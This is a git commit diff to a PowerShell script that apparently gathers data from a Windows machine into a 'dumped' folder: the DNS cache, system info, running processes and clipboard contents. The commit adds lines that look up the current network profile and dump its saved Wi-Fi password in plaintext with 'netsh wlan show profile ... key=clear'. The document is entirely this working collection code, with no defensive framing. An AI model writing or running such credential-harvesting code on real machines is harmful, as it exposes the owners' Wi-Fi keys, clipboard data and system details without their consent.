6a04014d05377d2870db3e6d65e5487bca941a6d
Mostafamabrok <mostafa.m.mabrok@gmail.com>
2023-08-22 11:15:24 +0300

    added the ability to get networkname and its info

--- main.ps1
+++ main.ps1
@@ -5,4 +5,5 @@ ipconfig /displaydns > dumped/dnsdisplay.txt
 systeminfo > dumped/sysinfo.txt 
 tasklist > dumped/tasklist.txt
 Get-Clipboard > dumped/clipboard.txt
-
+$networkname=Get-NetConnectionProfile | Select-Object -ExpandProperty Name
+Netsh wlan show profile name=$networkname key=clear > dumped/networkinfo.txt
